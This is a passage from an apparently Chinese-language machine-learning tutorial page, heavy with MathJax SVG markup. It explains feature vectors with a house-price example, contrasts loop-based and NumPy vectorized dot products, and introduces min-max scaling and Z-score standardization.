83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)" style="stroke-width: 3;"/><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(1000,0)" style="stroke-width: 3;"/><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z" transform="translate(1500,0)" style="stroke-width: 3;"/></g><g data-mml-node="mtext" transform="translate(12183.9,0)"><path data-c="A0" d="" style="stroke-width: 3;"/></g><g data-mml-node="mtext" transform="translate(12433.9,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">年</text></g><g data-mml-node="mo" transform="translate(13433.9,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z" style="stroke-width: 3;"/></g><g data-mml-node="mtext" transform="translate(13878.6,0)"><path data-c="A0" d="" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(14128.6,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" style="stroke-width: 3;"/><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)" style="stroke-width: 3;"/><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(1000,0)" style="stroke-width: 3;"/></g><g data-mml-node="mtext" transform="translate(15628.6,0)"><path data-c="A0" d="" style="stroke-width: 3;"/></g><g data-mml-node="mtext" transform="translate(15878.6,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">米</text><text data-variant="normal" transform="translate(1000,0) scale(1,-1)" font-size="884px" font-family="serif">到</text><text data-variant="normal" transform="translate(2000,0) scale(1,-1)" font-size="884px" font-family="serif">地</text><text data-variant="normal" transform="translate(3000,0) scale(1,-1)" font-size="884px" font-family="serif">铁</text></g><g data-mml-node="mo" transform="translate(19878.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z" style="stroke-width: 3;"/></g><g data-mml-node="mtext" transform="translate(20323.2,0)"><path data-c="A0" d="" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(20573.2,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">精</text></g><g data-mml-node="mi" transform="translate(21573.2,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">装</text></g><g data-mml-node="mi" transform="translate(22573.2,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">修</text></g><g data-mml-node="mo" transform="translate(23573.2,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mi>x</mi><mo>=</mo><mo stretchy="false">(</mo><mn>120</mn><mtext> </mtext><mtext>平方米</mtext><mo>,</mo><mtext> </mtext><mn>5</mn><mtext> </mtext><mtext>楼</mtext><mo>,</mo><mtext> </mtext><mn>2008</mn><mtext> </mtext><mtext>年</mtext><mo>,</mo><mtext> </mtext><mn>300</mn><mtext> </mtext><mtext>米到地铁</mtext><mo>,</mo><mtext> </mtext><mi mathvariant="normal">精</mi><mi mathvariant="normal">装</mi><mi mathvariant="normal">修</mi><mo stretchy="false">)</mo></math></mjx-assistive-mml></mjx-container><p>模型就根据这一整组特征，来学习预测结果，比如房价。</p><h3 id="向量化">向量化</h3><p><strong>向量化（Vectorization）<strong>指的是使用</strong>向量或矩阵运算</strong>代替传统的<strong>循环操作</strong>来处理数据，尤其是在模型训练和推理过程中。这种方式可以大幅提升程序执行效率，尤其在使用 <code>NumPy</code>、<code>Pandas</code> 或<code>TensorFlow</code>、<code>PyTorch</code> 等库时，能够显著减少运行时间。</p><p>例如：</p><p>普通做法，使用循环</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">w = [<span class="number">0.1</span>, <span class="number">0.2</span>, <span class="number">0.3</span>]</span><br><span class="line">y = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">    y += x[i] * w[i]</span><br><span class="line"><span class="built_in">print</span>(y)</span><br></pre></td></tr></table></figure><p>向量化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">x = np.array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line">w = np.array([<span class="number">0.1</span>, <span class="number">0.2</span>, <span class="number">0.3</span>])</span><br><span class="line">y = np.dot(x, w)  <span class="comment"># 点积</span></span><br><span class="line"><span class="built_in">print</span>(y)</span><br></pre></td></tr></table></figure><h2 id="特征缩放-Feature-Scaling">特征缩放(Feature Scaling)</h2><p><strong>特征缩放</strong>是机器学习中对输入特征数据进行规范化或标准化的过程，其主要目的是将不同量纲或范围的特征转换到相同的尺度上。这样做可以提高模型的训练效率和准确性，尤其对于以下算法效果显著：</p><ul><li><strong>梯度下降类算法</strong>（如线性回归、逻辑回归、神经网络）：避免某些特征主导梯度更新。</li><li><strong>基于距离的算法</strong>（如<code>KNN</code>、<code>SVM</code>、<code>K-means</code>）：距离计算对特征尺度敏感。</li><li><strong>正则化模型</strong>：如<code>L1(Lasso)</code>、<code>L2(Ridge)</code>正则化对特征尺度敏感。</li></ul><p>例如：</p><p>假设我们有一个特征是&quot;年龄&quot;，范围从18岁到70岁，还有一个特征是&quot;收入&quot;，范围从2,000到200,000，如果不进行缩放，模型可能会更关注收入，而忽略年龄。这种特征量纲的不一致会影响模型性能。</p><h3 id="最小-最大缩放（Min-Max-Scaling）"><strong>最小-最大缩放（Min-Max Scaling）</strong></h3><p>将特征缩放到 <mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="4.526ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 2000.7 1000" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(278,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(778,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(1222.7,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(1722.7,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mo stretchy="false">[</mo><mn>0</mn><mo>,</mo><mn>1</mn><mo stretchy="false">]</mo></math></mjx-assistive-mml></mjx-container> 或任意指定范围：</p><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -1.909ex;" xmlns="http://www.w3.org/2000/svg" width="17.308ex" height="4.757ex" role="img" focusable="false" viewbox="0 -1259 7650.1 2102.8" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(605,413) scale(0.707)"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(1127.2,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mfrac" transform="translate(2183,0)"><g data-mml-node="mrow" transform="translate(919.5,676)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(794.2,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msub" transform="translate(1794.4,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(605,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mtext"><path data-c="6D" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z" style="stroke-width: 3;"/><path data-c="69" d="M69 609Q69 637 87 653T131 669Q154 667 171 652T188 609Q188 579 171 564T129 549Q104 549 87 564T69 609ZM247 0Q232 3 143 3Q132 3 106 3T56 1L34 0H26V46H42Q70 46 91 49Q100 53 102 60T104 102V205V293Q104 345 102 359T88 378Q74 385 41 385H30V408Q30 431 32 431L42 432Q52 433 70 434T106 436Q123 437 142 438T171 441T182 442H185V62Q190 52 197 50T232 46H255V0H247Z" transform="translate(833,0)" style="stroke-width: 3;"/><path data-c="6E" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q450 438 463 329Q464 322 464 190V104Q464 66 466 59T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z" transform="translate(1111,0)" style="stroke-width: 3;"/></g></g></g></g><g data-mml-node="mrow" transform="translate(220,-686)"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(605,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mtext"><path data-c="6D" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z" style="stroke-width: 3;"/><path data-c="61" d="M137 305T115 305T78 320T63 359Q63 394 97 421T218 448Q291 448 336 416T396 340Q401 326 401 309T402 194V124Q402 76 407 58T428 40Q443 40 448 56T453 109V145H493V106Q492 66 490 59Q481 29 455 12T400 -6T353 12T329 54V58L327 55Q325 52 322 49T314 40T302 29T287 17T269 6T247 -2T221 -8T190 -11Q130 -11 82 20T34 107Q34 128 41 147T68 188T116 225T194 253T304 268H318V290Q318 324 312 340Q290 411 215 411Q197 411 181 410T156 406T148 403Q170 388 170 359Q170 334 154 320ZM126 106Q126 75 150 51T209 26Q247 26 276 49T315 109Q317 116 318 175Q318 233 317 233Q309 233 296 232T251 223T193 203T147 166T126 106Z" transform="translate(833,0)" style="stroke-width: 3;"/><path data-c="78" d="M201 0Q189 3 102 3Q26 3 17 0H11V46H25Q48 47 67 52T96 61T121 78T139 96T160 122T180 150L226 210L168 288Q159 301 149 315T133 336T122 351T113 363T107 370T100 376T94 379T88 381T80 383Q74 383 44 385H16V431H23Q59 429 126 429Q219 429 229 431H237V385Q201 381 201 369Q201 367 211 353T239 315T268 274L272 270L297 304Q329 345 329 358Q329 364 327 369T322 376T317 380T310 384L307 385H302V431H309Q324 428 408 428Q487 428 493 431H499V385H492Q443 385 411 368Q394 360 377 341T312 257L296 236L358 151Q424 61 429 57T446 50Q464 46 499 46H516V0H510H502Q494 1 482 1T457 2T432 2T414 3Q403 3 377 3T327 1L304 0H295V46H298Q309 46 320 51T331 63Q331 65 291 120L250 175Q249 174 219 133T185 88Q181 83 181 74Q181 63 188 55T206 46Q208 46 208 23V0H201Z" transform="translate(1333,0)" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(2193.1,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msub" transform="translate(3193.4,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(605,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mtext"><path data-c="6D" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z" style="stroke-width: 3;"/><path data-c="69" d="M69 609Q69 637 87 653T131 669Q154 667 171 652T188 609Q188 579 171 564T129 549Q104 549 87 564T69 609ZM247 0Q232 3 143 3Q132 3 106 3T56 1L34 0H26V46H42Q70 46 91 49Q100 53 102 60T104 102V205V293Q104 345 102 359T88 378Q74 385 41 385H30V408Q30 431 32 431L42 432Q52 433 70 434T106 436Q123 437 142 438T171 441T182 442H185V62Q190 52 197 50T232 46H255V0H247Z" transform="translate(833,0)" style="stroke-width: 3;"/><path data-c="6E" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q450 438 463 329Q464 322 464 190V104Q464 66 466 59T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z" transform="translate(1111,0)" style="stroke-width: 3;"/></g></g></g></g><rect width="5227.1" height="60" x="120" y="220"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><msup><mi>x</mi><mo data-mjx-alternate="1">′</mo></msup><mo>=</mo><mfrac><mrow><mi>x</mi><mo>−</mo><msub><mi>x</mi><mrow data-mjx-texclass="ORD"><mtext>min</mtext></mrow></msub></mrow><mrow><msub><mi>x</mi><mrow data-mjx-texclass="ORD"><mtext>max</mtext></mrow></msub><mo>−</mo><msub><mi>x</mi><mrow data-mjx-texclass="ORD"><mtext>min</mtext></mrow></msub></mrow></mfrac></math></mjx-assistive-mml></mjx-container><p>适用于特征分布较为均匀的情况。</p><h3 id="标准化（Standardization）"><strong>标准化（Standardization）</strong></h3><p>将特征转为均值为0、标准差为1的分布（Z-score标准化）：</p><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -1.577ex;" xmlns="http://www.w3.org/2000/svg" width="11.358ex" height="4.425ex" role="img" focusable="false" viewbox="0 -1259 5020.5 1956" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(605,413) scale(0.707)"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(1127.2,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mfrac" transform="translate(2183,0)"><g data-mml-node="mrow" transform="translate(220,676)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 